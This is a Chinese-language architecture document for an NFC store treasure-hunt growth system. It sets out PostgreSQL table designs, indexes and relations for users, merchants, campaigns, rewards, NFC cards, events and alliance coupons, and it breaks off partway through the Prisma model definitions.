# NFC门店寻宝增长系统 - 技术架构文档

## 目录

1. [PostgreSQL数据库Schema设计](#1-postgresql数据库schema设计)
2. [Prisma Models](#2-prisma-models)
3. [API路由设计](#3-api路由设计)
4. [权限模型](#4-权限模型)
5. [事件埋点方案](#5-事件埋点方案)
6. [安全风险清单](#6-安全风险清单)
7. [性能考虑](#7-性能考虑)

---

## 1. PostgreSQL数据库Schema设计

### 1.1 ER关系图概览

```
users ──┬── staff (商家员工)
        ├── reward_claims (奖励领取)
        ├── task_submissions (任务提交)
        ├── coupon_claims (优惠券领取)
        └── events (行为事件)

merchants ──┬── stores (门店)
            ├── staff (员工)
            ├── campaigns (活动)
            ├── campaign_tasks (任务配置)
            ├── rewards (奖励配置)
            ├── nfc_cards (NFC卡)
            ├── audit_logs (审核日志)
            └── alliance_partners (异业合作)

stores ──┬── campaign_tasks
        ├── nfc_cards
        └── task_submissions

campaigns ──┬── campaign_tasks
           ├── rewards
           └── task_submissions

campaign_tasks ──┬── task_submissions
                └── ai_generations

alliance_partners ─── alliance_coupons ─── coupon_claims
```

### 1.2 表结构详细设计

#### 1.2.1 users (用户表)

| 字段名 | 类型 | 约束 | 说明 |
|--------|------|------|------|
| id | UUID | PK, DEFAULT gen_random_uuid() | 用户唯一标识 |
| phone | VARCHAR(20) | UNIQUE, NOT NULL | 手机号 |
| nickname | VARCHAR(100) | | 昵称 |
| avatar_url | VARCHAR(500) | | 头像URL |
| openid | VARCHAR(100) | UNIQUE | 微信OpenID |
| unionid | VARCHAR(100) | UNIQUE | 微信UnionID |
| real_name | VARCHAR(100) | | 真实姓名 |
| id_card | VARCHAR(20) | | 身份证号(奖励提现用) |
| status | SMALLINT | DEFAULT 1 | 状态: 0-禁用, 1-正常 |
| last_login_at | TIMESTAMP | | 最后登录时间 |
| last_login_ip | VARCHAR(50) | | 最后登录IP |
| created_at | TIMESTAMP | DEFAULT NOW() | 创建时间 |
| updated_at | TIMESTAMP | DEFAULT NOW() | 更新时间 |

**索引:**
- `idx_users_phone` ON (phone)
- `idx_users_openid` ON (openid)
- `idx_users_status` ON (status)

#### 1.2.2 merchants (商家表)

| 字段名 | 类型 | 约束 | 说明 |
|--------|------|------|------|
| id | UUID | PK, DEFAULT gen_random_uuid() | 商家唯一标识 |
| name | VARCHAR(200) | NOT NULL | 商家名称 |
| logo_url | VARCHAR(500) | | 商家Logo |
| contact_name | VARCHAR(100) | | 联系人姓名 |
| contact_phone | VARCHAR(20) | | 联系人电话 |
| contact_email | VARCHAR(200) | | 联系人邮箱 |
| business_license | VARCHAR(500) | | 营业执照URL |
| province | VARCHAR(50) | | 省份 |
| city | VARCHAR(50) | | 城市 |
| district | VARCHAR(50) | | 区县 |
| address | VARCHAR(500) | | 详细地址 |
| longitude | DECIMAL(10,7) | | 经度 |
| latitude | DECIMAL(10,7) | | 纬度 |
| status | SMALLINT | DEFAULT 1 | 状态: 0-禁用, 1-正常, 2-待审核 |
| category | VARCHAR(50) | | 行业分类 |
| description | TEXT | | 商家描述 |
| created_at | TIMESTAMP | DEFAULT NOW() | 创建时间 |
| updated_at | TIMESTAMP | DEFAULT NOW() | 更新时间 |

**索引:**
- `idx_merchants_status` ON (status)
- `idx_merchants_category` ON (category)
- `idx_merchants_city` ON (province, city)

#### 1.2.3 stores (门店表)

| 字段名 | 类型 | 约束 | 说明 |
|--------|------|------|------|
| id | UUID | PK, DEFAULT gen_random_uuid() | 门店唯一标识 |
| merchant_id | UUID | FK → merchants(id), NOT NULL | 所属商家ID |
| name | VARCHAR(200) | NOT NULL | 门店名称 |
| store_code | VARCHAR(50) | UNIQUE | 门店编码 |
| contact_phone | VARCHAR(20) | | 门店电话 |
| province | VARCHAR(50) | | 省份 |
| city | VARCHAR(50) | | 城市 |
| district | VARCHAR(50) | | 区县 |
| address | VARCHAR(500) | NOT NULL | 详细地址 |
| longitude | DECIMAL(10,7) | | 经度 |
| latitude | DECIMAL(10,7) | | 纬度 |
| business_hours | VARCHAR(200) | | 营业时间 |
| status | SMALLINT | DEFAULT 1 | 状态: 0-禁用, 1-正常 |
| created_at | TIMESTAMP | DEFAULT NOW() | 创建时间 |
| updated_at | TIMESTAMP | DEFAULT NOW() | 更新时间 |

**索引:**
- `idx_stores_merchant_id` ON (merchant_id)
- `idx_stores_status` ON (status)
- `idx_stores_location` ON (longitude, latitude)

**关系:**
- `merchant_id` → merchants(id) [ON DELETE CASCADE]

#### 1.2.4 staff (员工表)

| 字段名 | 类型 | 约束 | 说明 |
|--------|------|------|------|
| id | UUID | PK, DEFAULT gen_random_uuid() | 员工唯一标识 |
| user_id | UUID | FK → users(id), NOT NULL, UNIQUE | 关联用户ID |
| merchant_id | UUID | FK → merchants(id), NOT NULL | 所属商家ID |
| store_id | UUID | FK → stores(id) | 所属门店ID(可为空) |
| employee_no | VARCHAR(50) | | 员工工号 |
| name | VARCHAR(100) | NOT NULL | 员工姓名 |
| phone | VARCHAR(20) | NOT NULL | 手机号 |
| role | SMALLINT | NOT NULL | 角色: 1-管理员, 2-店长, 3-店员 |
| department | VARCHAR(100) | | 部门 |
| position | VARCHAR(100) | | 职位 |
| status | SMALLINT | DEFAULT 1 | 状态: 0-禁用, 1-正常 |
| hired_at | DATE | | 入职日期 |
| created_at | TIMESTAMP | DEFAULT NOW() | 创建时间 |
| updated_at | TIMESTAMP | DEFAULT NOW() | 更新时间 |

**索引:**
- `idx_staff_user_id` ON (user_id) UNIQUE
- `idx_staff_merchant_id` ON (merchant_id)
- `idx_staff_store_id` ON (store_id)
- `idx_staff_role` ON (role)
- `idx_staff_phone` ON (phone)

**关系:**
- `user_id` → users(id) [ON DELETE CASCADE]
- `merchant_id` → merchants(id) [ON DELETE CASCADE]
- `store_id` → stores(id) [ON DELETE SET NULL]

#### 1.2.5 campaigns (活动表)

| 字段名 | 类型 | 约束 | 说明 |
|--------|------|------|------|
| id | UUID | PK, DEFAULT gen_random_uuid() | 活动唯一标识 |
| merchant_id | UUID | FK → merchants(id), NOT NULL | 所属商家ID |
| name | VARCHAR(200) | NOT NULL | 活动名称 |
| description | TEXT | | 活动描述 |
| cover_image | VARCHAR(500) | | 活动封面图 |
| rules | JSONB | | 活动规则配置 |
| start_time | TIMESTAMP | NOT NULL | 开始时间 |
| end_time | TIMESTAMP | NOT NULL | 结束时间 |
| status | SMALLINT | DEFAULT 2 | 状态: 0-草稿, 1-待审核, 2-进行中, 3-已结束, 4-已下线 |
| target_type | SMALLINT | | 目标类型: 1-拉新, 2-复购, 3-品牌曝光 |
| budget | DECIMAL(12,2) | | 活动预算 |
| actual_cost | DECIMAL(12,2) | DEFAULT 0 | 实际消耗 |
| participation_count | INTEGER | DEFAULT 0 | 参与人次 |
| success_count | INTEGER | DEFAULT 0 | 完成人次 |
| review_remark | VARCHAR(500) | | 审核备注 |
| reviewed_at | TIMESTAMP | | 审核时间 |
| reviewed_by | UUID | FK → staff(id) | 审核人 |
| created_at | TIMESTAMP | DEFAULT NOW() | 创建时间 |
| updated_at | TIMESTAMP | DEFAULT NOW() | 更新时间 |

**索引:**
- `idx_campaigns_merchant_id` ON (merchant_id)
- `idx_campaigns_status` ON (status)
- `idx_campaigns_time` ON (start_time, end_time)
- `idx_campaigns_reviewed_by` ON (reviewed_by)

**关系:**
- `merchant_id` → merchants(id) [ON DELETE CASCADE]
- `reviewed_by` → staff(id) [ON DELETE SET NULL]

#### 1.2.6 campaign_tasks (任务配置表)

| 字段名 | 类型 | 约束 | 说明 |
|--------|------|------|------|
| id | UUID | PK, DEFAULT gen_random_uuid() | 任务配置唯一标识 |
| campaign_id | UUID | FK → campaigns(id), NOT NULL | 所属活动ID |
| store_id | UUID | FK → stores(id) | 限定门店(可为空表示全部门店) |
| task_no | SMALLINT | NOT NULL | 任务序号(1,2,3代表三关) |
| name | VARCHAR(200) | NOT NULL | 任务名称 |
| description | TEXT | | 任务描述 |
| task_type | SMALLINT | NOT NULL | 任务类型: 1-NFC触发, 2-拍照打卡, 3-AI生成, 4-加企微, 5-填写信息 |
| rule_config | JSONB | NOT NULL | 规则配置(验证逻辑、奖励倍数等) |
| proof_config | JSONB | | 凭证配置(需要上传的凭证类型) |
| ai_prompt | TEXT | | AI生成提示词 |
| ai_model | VARCHAR(100) | | AI模型名称 |
| reward_config | JSONB | | 任务奖励配置 |
| status | SMALLINT | DEFAULT 1 | 状态: 0-禁用, 1-启用 |
| sort_order | SMALLINT | DEFAULT 0 | 排序 |
| created_at | TIMESTAMP | DEFAULT NOW() | 创建时间 |
| updated_at | TIMESTAMP | DEFAULT NOW() | 更新时间 |

**索引:**
- `idx_campaign_tasks_campaign_id` ON (campaign_id)
- `idx_campaign_tasks_store_id` ON (store_id)
- `idx_campaign_tasks_task_no` ON (task_no)
- `idx_campaign_tasks_status` ON (status)

**关系:**
- `campaign_id` → campaigns(id) [ON DELETE CASCADE]
- `store_id` → stores(id) [ON DELETE CASCADE]

#### 1.2.7 task_submissions (任务提交表)

| 字段名 | 类型 | 约束 | 说明 |
|--------|------|------|------|
| id | UUID | PK, DEFAULT gen_random_uuid() | 提交记录唯一标识 |
| user_id | UUID | FK → users(id), NOT NULL | 用户ID |
| campaign_id | UUID | FK → campaigns(id), NOT NULL | 活动ID |
| task_id | UUID | FK → campaign_tasks(id), NOT NULL | 任务配置ID |
| store_id | UUID | FK → stores(id) | 提交门店 |
| submission_no | VARCHAR(50) | NOT NULL | 提交编号 |
| content | JSONB | | 提交内容(AI生成内容、照片URL等) |
| proof_images | JSONB | | 凭证图片列表 |
| proof_text | TEXT | | 凭证文字 |
| status | SMALLINT | DEFAULT 1 | 状态: 0-草稿, 1-待审核, 2-已通过, 3-已拒绝, 4-已撤回 |
| reject_reason | VARCHAR(500) | | 拒绝原因 |
| reviewed_at | TIMESTAMP | | 审核时间 |
| reviewed_by | UUID | FK → staff(id) | 审核人 |
| review_remark | VARCHAR(500) | | 审核备注 |
| nfc_tag | VARCHAR(200) | | NFC标签ID |
| device_info | JSONB | | 设备信息 |
| location | JSONB | | 地理位置 |
| ip_address | VARCHAR(50) | | IP地址 |
| completed_at | TIMESTAMP | | 完成时间 |
| created_at | TIMESTAMP | DEFAULT NOW() | 创建时间 |
| updated_at | TIMESTAMP | DEFAULT NOW() | 更新时间 |

**索引:**
- `idx_task_submissions_user_id` ON (user_id)
- `idx_task_submissions_campaign_id` ON (campaign_id)
- `idx_task_submissions_task_id` ON (task_id)
- `idx_task_submissions_store_id` ON (store_id)
- `idx_task_submissions_status` ON (status)
- `idx_task_submissions_submission_no` ON (submission_no) UNIQUE
- `idx_task_submissions_created_at` ON (created_at)
- `idx_task_submissions_reviewed_by` ON (reviewed_by)

**关系:**
- `user_id` → users(id) [ON DELETE CASCADE]
- `campaign_id` → campaigns(id) [ON DELETE CASCADE]
- `task_id` → campaign_tasks(id) [ON DELETE CASCADE]
- `store_id` → stores(id) [ON DELETE SET NULL]
- `reviewed_by` → staff(id) [ON DELETE SET NULL]

#### 1.2.8 rewards (奖励配置表)

| 字段名 | 类型 | 约束 | 说明 |
|--------|------|------|------|
| id | UUID | PK, DEFAULT gen_random_uuid() | 奖励配置唯一标识 |
| campaign_id | UUID | FK → campaigns(id), NOT NULL | 所属活动ID |
| name | VARCHAR(200) | NOT NULL | 奖励名称 |
| reward_type | SMALLINT | NOT NULL | 奖励类型: 1-优惠券, 2-红包, 3-积分, 4-实物, 5-兑换码 |
| value | DECIMAL(10,2) | | 奖励值(金额/数量) |
| total_quantity | INTEGER | | 总数量 |
| claimed_count | INTEGER | DEFAULT 0 | 已领取数量 |
| used_count | INTEGER | DEFAULT 0 | 已使用数量 |
| limit_per_user | INTEGER | DEFAULT 1 | 每人限领次数 |
| min_task_completed | SMALLINT | DEFAULT 3 | 最少完成任务数 |
| valid_days | INTEGER | | 有效期(天) |
| valid_start_at | TIMESTAMP | | 有效期开始时间 |
| valid_end_at | TIMESTAMP | | 有效期结束时间 |
| rules | JSONB | | 使用规则 |
| coupon_template_id | VARCHAR(100) | | 关联优惠券模板ID |
| status | SMALLINT | DEFAULT 1 | 状态: 0-禁用, 1-启用 |
| created_at | TIMESTAMP | DEFAULT NOW() | 创建时间 |
| updated_at | TIMESTAMP | DEFAULT NOW() | 更新时间 |

**索引:**
- `idx_rewards_campaign_id` ON (campaign_id)
- `idx_rewards_reward_type` ON (reward_type)
- `idx_rewards_status` ON (status)

**关系:**
- `campaign_id` → campaigns(id) [ON DELETE CASCADE]

#### 1.2.9 reward_claims (奖励领取表)

| 字段名 | 类型 | 约束 | 说明 |
|--------|------|------|------|
| id | UUID | PK, DEFAULT gen_random_uuid() | 领取记录唯一标识 |
| user_id | UUID | FK → users(id), NOT NULL | 用户ID |
| reward_id | UUID | FK → rewards(id), NOT NULL | 奖励配置ID |
| campaign_id | UUID | FK → campaigns(id), NOT NULL | 活动ID |
| claim_no | VARCHAR(50) | NOT NULL | 领取编号 |
| reward_type | SMALLINT | NOT NULL | 奖励类型(冗余) |
| reward_value | DECIMAL(10,2) | | 奖励值(冗余) |
| coupon_code | VARCHAR(100) | | 优惠券码 |
| qr_code | VARCHAR(500) | | 二维码URL |
| status | SMALLINT | DEFAULT 1 | 状态: 1-已领取, 2-已使用, 3-已过期, 4-已失效 |
| claimed_at | TIMESTAMP | DEFAULT NOW() | 领取时间 |
| used_at | TIMESTAMP | | 使用时间 |
| expire_at | TIMESTAMP | | 过期时间 |
| used_store_id | UUID | FK → stores(id) | 使用门店 |
| used_transaction_no | VARCHAR(100) | | 核销交易号 |
| created_at | TIMESTAMP | DEFAULT NOW() | 创建时间 |
| updated_at | TIMESTAMP | DEFAULT NOW() | 更新时间 |

**索引:**
- `idx_reward_claims_user_id` ON (user_id)
- `idx_reward_claims_reward_id` ON (reward_id)
- `idx_reward_claims_campaign_id` ON (campaign_id)
- `idx_reward_claims_claim_no` ON (claim_no) UNIQUE
- `idx_reward_claims_status` ON (status)
- `idx_reward_claims_coupon_code` ON (coupon_code)
- `idx_reward_claims_expire_at` ON (expire_at) WHERE (status = 1)

**关系:**
- `user_id` → users(id) [ON DELETE CASCADE]
- `reward_id` → rewards(id) [ON DELETE CASCADE]
- `campaign_id` → campaigns(id) [ON DELETE CASCADE]
- `used_store_id` → stores(id) [ON DELETE SET NULL]

#### 1.2.10 nfc_cards (NFC卡表)

| 字段名 | 类型 | 约束 | 说明 |
|--------|------|------|------|
| id | UUID | PK, DEFAULT gen_random_uuid() | NFC卡唯一标识 |
| store_id | UUID | FK → stores(id), NOT NULL | 所属门店ID |
| card_no | VARCHAR(100) | NOT NULL | NFC卡号 |
| card_uid | VARCHAR(100) | UNIQUE | NFC卡UID |
| card_type | SMALLINT | DEFAULT 1 | 卡类型: 1-桌贴, 2-立牌, 3-手牌 |
| location_desc | VARCHAR(200) | | 位置描述 |
| campaign_id | UUID | FK → campaigns(id) | 绑定的活动 |
| status | SMALLINT | DEFAULT 1 | 状态: 0-禁用, 1-启用 |
| tap_count | INTEGER | DEFAULT 0 | 触碰次数 |
| unique_tap_count | INTEGER | DEFAULT 0 | 独立用户触碰次数 |
| last_tap_at | TIMESTAMP | | 最后触碰时间 |
| batch_no | VARCHAR(50) | | 批次号 |
| manufactured_at | DATE | | 生产日期 |
| activated_at | TIMESTAMP | | 激活时间 |
| created_at | TIMESTAMP | DEFAULT NOW() | 创建时间 |
| updated_at | TIMESTAMP | DEFAULT NOW() | 更新时间 |

**索引:**
- `idx_nfc_cards_store_id` ON (store_id)
- `idx_nfc_cards_card_no` ON (card_no)
- `idx_nfc_cards_card_uid` ON (card_uid) UNIQUE
- `idx_nfc_cards_campaign_id` ON (campaign_id)
- `idx_nfc_cards_status` ON (status)

**关系:**
- `store_id` → stores(id) [ON DELETE CASCADE]
- `campaign_id` → campaigns(id) [ON DELETE SET NULL]

#### 1.2.11 events (事件表)

| 字段名 | 类型 | 约束 | 说明 |
|--------|------|------|------|
| id | UUID | PK, DEFAULT gen_random_uuid() | 事件唯一标识 |
| event_type | VARCHAR(50) | NOT NULL | 事件类型 |
| user_id | UUID | FK → users(id) | 用户ID |
| session_id | VARCHAR(100) | | 会话ID |
| device_info | JSONB | | 设备信息 |
| browser | VARCHAR(100) | | 浏览器 |
| os | VARCHAR(50) | | 操作系统 |
| screen | VARCHAR(50) | | 屏幕分辨率 |
| network | VARCHAR(20) | | 网络类型 |
| ip_address | VARCHAR(50) | | IP地址 |
| country | VARCHAR(50) | | 国家 |
| province | VARCHAR(50) | | 省份 |
| city | VARCHAR(50) | | 城市 |
| latitude | DECIMAL(10,7) | | 纬度 |
| longitude | DECIMAL(10,7) | | 经度 |
| url | VARCHAR(500) | | 页面URL |
| referrer | VARCHAR(500) | | 来源页面 |
| event_data | JSONB | NOT NULL | 事件数据 |
| client_time | TIMESTAMP | | 客户端时间 |
| server_time | TIMESTAMP | DEFAULT NOW() | 服务端时间 |

**索引:**
- `idx_events_event_type` ON (event_type)
- `idx_events_user_id` ON (user_id)
- `idx_events_session_id` ON (session_id)
- `idx_events_server_time` ON (server_time)
- `idx_events_campaign_id` ON ((event_data->>'campaign_id')) WHERE event_type IN ('task_start', 'task_submit', 'reward_claimed')

**关系:**
- `user_id` → users(id) [ON DELETE SET NULL]

**分区策略:** 按 server_time 按月分区

#### 1.2.12 ai_generations (AI生成记录表)

| 字段名 | 类型 | 约束 | 说明 |
|--------|------|------|------|
| id | UUID | PK, DEFAULT gen_random_uuid() | 记录唯一标识 |
| user_id | UUID | FK → users(id), NOT NULL | 用户ID |
| task_id | UUID | FK → campaign_tasks(id), NOT NULL | 任务配置ID |
| submission_id | UUID | FK → task_submissions(id) | 提交记录ID |
| model | VARCHAR(100) | NOT NULL | AI模型 |
| prompt | TEXT | NOT NULL | 输入提示词 |
| content | TEXT | | 生成内容 |
| image_url | VARCHAR(500) | | 生成图片URL |
| tokens_used | INTEGER | | 消耗token数 |
| generation_type | SMALLINT | NOT NULL | 生成类型: 1-文案, 2-图片, 3-混合 |
| status | SMALLINT | DEFAULT 1 | 状态: 0-失败, 1-成功 |
| error_message | TEXT | | 错误信息 |
| cost | DECIMAL(8,4) | | 成本费用 |
| processing_time | INTEGER | | 处理时长(ms) |
| created_at | TIMESTAMP | DEFAULT NOW() | 创建时间 |

**索引:**
- `idx_ai_generations_user_id` ON (user_id)
- `idx_ai_generations_task_id` ON (task_id)
- `idx_ai_generations_submission_id` ON (submission_id)
- `idx_ai_generations_model` ON (model)
- `idx_ai_generations_created_at` ON (created_at)

**关系:**
- `user_id` → users(id) [ON DELETE CASCADE]
- `task_id` → campaign_tasks(id) [ON DELETE CASCADE]
- `submission_id` → task_submissions(id) [ON DELETE SET NULL]

#### 1.2.13 alliance_partners (异业商家表)

| 字段名 | 类型 | 约束 | 说明 |
|--------|------|------|------|
| id | UUID | PK, DEFAULT gen_random_uuid() | 异业商家唯一标识 |
| merchant_id | UUID | FK → merchants(id), NOT NULL | 发起商家ID |
| partner_name | VARCHAR(200) | NOT NULL | 合作方名称 |
| partner_logo | VARCHAR(500) | | 合作方Logo |
| partner_type | SMALLINT | NOT NULL | 合作类型: 1-优惠券合作, 2-流量互换, 3-联合活动 |
| contact_name | VARCHAR(100) | | 联系人姓名 |
| contact_phone | VARCHAR(20) | | 联系人电话 |
| contact_wechat | VARCHAR(100) | | 联系人微信 |
| province | VARCHAR(50) | | 省份 |
| city | VARCHAR(50) | | 城市 |
| industry | VARCHAR(50) | | 行业 |
| description | TEXT | | 合作描述 |
| contract_start | DATE | | 合同开始日期 |
| contract_end | DATE | | 合同结束日期 |
| commission_rate | DECIMAL(5,2) | | 佣金比例(%) |
| status | SMALLINT | DEFAULT 1 | 状态: 0-已终止, 1-合作中, 2-待审核 |
| created_at | TIMESTAMP | DEFAULT NOW() | 创建时间 |
| updated_at | TIMESTAMP | DEFAULT NOW() | 更新时间 |

**索引:**
- `idx_alliance_partners_merchant_id` ON (merchant_id)
- `idx_alliance_partners_status` ON (status)
- `idx_alliance_partners_partner_type` ON (partner_type)

**关系:**
- `merchant_id` → merchants(id) [ON DELETE CASCADE]

#### 1.2.14 alliance_coupons (异业优惠券表)

| 字段名 | 类型 | 约束 | 说明 |
|--------|------|------|------|
| id | UUID | PK, DEFAULT gen_random_uuid() | 优惠券唯一标识 |
| partner_id | UUID | FK → alliance_partners(id), NOT NULL | 异业商家ID |
| campaign_id | UUID | FK → campaigns(id) | 关联活动(可为空) |
| name | VARCHAR(200) | NOT NULL | 优惠券名称 |
| description | TEXT | | 优惠券描述 |
| coupon_type | SMALLINT | NOT NULL | 券类型: 1-满减券, 2-折扣券, 3-兑换券, 4-体验券 |
| face_value | DECIMAL(10,2) | | 面值 |
| min_consume | DECIMAL(10,2) | | 最低消费 |
| discount_rate | DECIMAL(5,2) | | 折扣率(如80代表8折) |
| total_quantity | INTEGER | | 总数量 |
| claimed_count | INTEGER | DEFAULT 0 | 已领取数量 |
| used_count | INTEGER | DEFAULT 0 | 已使用数量 |
| per_user_limit | INTEGER | DEFAULT 1 | 每人限领 |
| valid_days | INTEGER | | 有效期(天) |
| valid_start_at | TIMESTAMP | | 有效期开始 |
| valid_end_at | TIMESTAMP | | 有效期结束 |
| use_rules | TEXT | | 使用规则 |
| image_url | VARCHAR(500) | | 券图片 |
| code_prefix | VARCHAR(20) | | 券码前缀 |
| third_party_code | VARCHAR(100) | | 第三方券码 |
| status | SMALLINT | DEFAULT 1 | 状态: 0-禁用, 1-待投放, 2-投放中, 3-已下架 |
| created_at | TIMESTAMP | DEFAULT NOW() | 创建时间 |
| updated_at | TIMESTAMP | DEFAULT NOW() | 更新时间 |

**索引:**
- `idx_alliance_coupons_partner_id` ON (partner_id)
- `idx_alliance_coupons_campaign_id` ON (campaign_id)
- `idx_alliance_coupons_status` ON (status)
- `idx_alliance_coupons_valid_end_at` ON (valid_end_at)

**关系:**
- `partner_id` → alliance_partners(id) [ON DELETE CASCADE]
- `campaign_id` → campaigns(id) [ON DELETE SET NULL]

#### 1.2.15 coupon_claims (优惠券领取表)

| 字段名 | 类型 | 约束 | 说明 |
|--------|------|------|------|
| id | UUID | PK, DEFAULT gen_random_uuid() | 领取记录唯一标识 |
| user_id | UUID | FK → users(id), NOT NULL | 用户ID |
| coupon_id | UUID | FK → alliance_coupons(id), NOT NULL | 优惠券ID |
| campaign_id | UUID | FK → campaigns(id) | 关联活动ID |
| claim_no | VARCHAR(50) | NOT NULL | 领取编号 |
| coupon_code | VARCHAR(100) | | 券码 |
| qr_code | VARCHAR(500) | | 二维码URL |
| status | SMALLINT | DEFAULT 1 | 状态: 1-已领取, 2-已使用, 3-已过期, 4-已失效 |
| source | SMALLINT | DEFAULT 1 | 来源: 1-活动任务, 2-分享, 3-主动领取 |
| claimed_at | TIMESTAMP | DEFAULT NOW() | 领取时间 |
| used_at | TIMESTAMP | | 使用时间 |
| expire_at | TIMESTAMP | | 过期时间 |
| used_store_name | VARCHAR(200) | | 使用门店名称 |
| used_transaction_no | VARCHAR(100) | | 核销交易号 |
| created_at | TIMESTAMP | DEFAULT NOW() | 创建时间 |
| updated_at | TIMESTAMP | DEFAULT NOW() | 更新时间 |

**索引:**
- `idx_coupon_claims_user_id` ON (user_id)
- `idx_coupon_claims_coupon_id` ON (coupon_id)
- `idx_coupon_claims_campaign_id` ON (campaign_id)
- `idx_coupon_claims_claim_no` ON (claim_no) UNIQUE
- `idx_coupon_claims_coupon_code` ON (coupon_code)
- `idx_coupon_claims_status` ON (status)
- `idx_coupon_claims_expire_at` ON (expire_at) WHERE (status = 1)

**关系:**
- `user_id` → users(id) [ON DELETE CASCADE]
- `coupon_id` → alliance_coupons(id) [ON DELETE CASCADE]
- `campaign_id` → campaigns(id) [ON DELETE SET NULL]

#### 1.2.16 audit_logs (审核日志表)

| 字段名 | 类型 | 约束 | 说明 |
|--------|------|------|------|
| id | UUID | PK, DEFAULT gen_random_uuid() | 日志唯一标识 |
| audit_type | VARCHAR(50) | NOT NULL | 审核类型: campaign_review, submission_review, merchant_review |
| target_id | UUID | NOT NULL | 审核对象ID |
| target_type | VARCHAR(50) | NOT NULL | 审核对象类型 |
| action | SMALLINT | NOT NULL | 操作: 1-提交, 2-通过, 3-拒绝, 4-撤回, 5-修改 |
| operator_id | UUID | FK → staff(id) | 操作人ID |
| operator_name | VARCHAR(100) | | 操作人姓名 |
| operator_role | SMALLINT | | 操作人角色 |
| before_status | SMALLINT | | 变更前状态 |
| after_status | SMALLINT | | 变更后状态 |
| remark | TEXT | | 备注 |
| attachments | JSONB | | 附件(截图、文件等) |
| ip_address | VARCHAR(50) | | IP地址 |
| user_agent | VARCHAR(500) | | 用户代理 |
| created_at | TIMESTAMP | DEFAULT NOW() | 创建时间 |

**索引:**
- `idx_audit_logs_audit_type` ON (audit_type)
- `idx_audit_logs_target_id` ON (target_id)
- `idx_audit_logs_target_type` ON (target_type)
- `idx_audit_logs_operator_id` ON (operator_id)
- `idx_audit_logs_created_at` ON (created_at)

**关系:**
- `operator_id` → staff(id) [ON DELETE SET NULL]

---

## 2. Prisma Models

```prisma
generator client {
  provider = "prisma-client-js"
}

datasource db {
  provider = "postgresql"
  url      = env("DATABASE_URL")
}

// ==================== 用户相关 ====================

model User {
  id           String   @id @default(uuid())
  phone        String   @unique @db.VarChar(20)
  nickname     String?  @db.VarChar(100)
  avatarUrl    String?  @map("avatar_url") @db.VarChar(500)
  openid       String?  @unique @db.VarChar(100)
  unionid      String?  @unique @db.VarChar(100)
  realName     String?  @map("real_name") @db.VarChar(100)
  idCard       String?  @map("id_card") @db.VarChar(20)
  status       Int      @default(1) // 0-禁用, 1-正常
  lastLoginAt  DateTime? @map("last_login_at")
  lastLoginIp  String?  @map("last_login_ip") @db.VarChar(50)
  createdAt    DateTime @default(now()) @map("created_at")
  updatedAt    DateTime @updatedAt @map("updated_at")

  // 关系
  staff              Staff?
  taskSubmissions    TaskSubmission[]
  rewardClaims       RewardClaim[]
  couponClaims       CouponClaim[]
  aiGenerations      AIGeneration[]
  events             Event[]

  @@index([phone])
  @@index([openid])
  @@index([status])
  @@map("users")
}

// ==================== 商家相关 ====================

model Merchant {
  id              String   @id @default(uuid())
  name            String   @db.VarChar(200)
  logoUrl         String?  @map("logo_url") @db.VarChar(500)
  contactName     String?  @map("contact_name") @db.VarChar(100)
  contactPhone    String?  @map("contact_phone") @db.VarChar(20)
  contactEmail    String?  @map("contact_email") @db.VarChar(200)
  businessLicense String?  @map("business_license") @db.VarChar(500)
  province        String?  @db.VarChar(50)
  city            String?  @db.VarChar(50)
  district        String?  @db.VarChar(50)
  address         String?  @db.VarChar(500)
  longitude       Decimal? @db.Decimal(10, 7)
  latitude        Decimal? @db.Decimal(10, 7)
  status          Int      @default(1) // 0-禁用, 1-正常, 2-待审核
  category        String?  @db.VarChar(50)
  description     String?  @db.Text
  createdAt       DateTime @default(now()) @map("created_at")
  updatedAt       DateTime @updatedAt @map("updated_at")

  // 关系
  stores           Store[]
  staff            Staff[]
  campaigns        Campaign[]
  alliancePartners AlliancePartner[]

  @@index([status])
  @@index([category])
  @@index([province, city])
  @@map("merchants")
}

model Store {
  id            String   @id @default(uuid())
  merchantId    String   @map("merchant_id")
  name          String   @db.VarChar(200)
  storeCode     String?  @unique @map("store_code") @db.VarChar(50)
  contactPhone  String?  @map("contact_phone") @db.VarChar(20)
  province      String?  @db.VarChar(50)
  city          String?  @db.VarChar(50)
  district      String?  @db.VarChar(50)
  address       String   @db.VarChar(500)
  longitude     Decimal? @db.Decimal(10, 7)
  latitude      Decimal? @db.Decimal(10, 7)
  businessHours String?  @map("business_hours") @db.VarChar(200)
  status        Int      @default(1) // 0-禁用, 1-正常
  createdAt     DateTime @default(now()) @map("created_at")
  updatedAt     DateTime @updatedAt @map("updated_at")

  // 关系
  merchant         Merchant          @relation(fields: [merchantId], references: [id], onDelete: Cascade)
  staff            Staff[]
  campaigns        CampaignTask[]
  nfcCards         NFCCard[]
  taskSubmissions  TaskSubmission[]
  rewardClaims     RewardClaim[]

  @@index([merchantId])
  @@index([status])
  @@index([longitude, latitude])
  @@map("stores")
}

model Staff {
  id           String   @id @default(uuid())
  userId       String   @unique @map("user_id")
  merchantId   String   @map("merchant_id")
  storeId      String?  @map("store_id")
  employeeNo   String?  @map("employee_no") @db.VarChar(50)
  name         String   @db.VarChar(100)
  phone        String   @db.VarChar(20)
  role         Int      // 1-管理员, 2-店长, 3-店员
  department   String?  @db.VarChar(100)
  position     String?  @db.VarChar(100)
  status       Int      @default(1) // 0-禁用, 1-正常
  hiredAt      DateTime? @map("hired_at") @db.Date
  createdAt    DateTime @default(now()) @map("created_at")
  updatedAt    DateTime @updatedAt @map("updated_at")

  // 关系
  user              User              @relation(fields: [userId], references: [id], onDelete: Cascade)
  merchant          Merchant          @relation(fields: [merchantId], references: [id], onDelete: Cascade)
  store             Store?            @relation(fields: [storeId], references: [id], onDelete: SetNull)
  reviewedSubmissions TaskSubmission[] @relation("ReviewedBy")
  auditLogs         AuditLog[]

  @@index([userId])
  @@index([merchantId])
  @@index([storeId])
  @@index([role])
  @@index([phone])
  @@map("staff")
}

// ==================== 活动相关 ====================

model Campaign {
  id                 String    @id @default(uuid())
  merchantId         String    @map("merchant_id")
  name               String    @db.VarChar(200)
  description        String?   @db.Text
  coverImage         String?   @map("cover_image") @db.VarChar(500)
  rules              Json?     // 活动规则配置
  startTime          DateTime  @map("start_time")
  endTime            DateTime  @map("end_time")
  status             Int       @default(2) // 0-草稿, 1-待审核, 2-进行中, 3-已结束, 4-已下线
  targetType         Int?      @map("target_type") // 1-拉新, 2-复购, 3-品牌曝光
  budget             Decimal?  @db.Decimal(12, 2)
  actualCost         Decimal   @default(0) @map("actual_cost") @db.Decimal(12, 2)
  participationCount Int       @default(0) @map("participation_count")
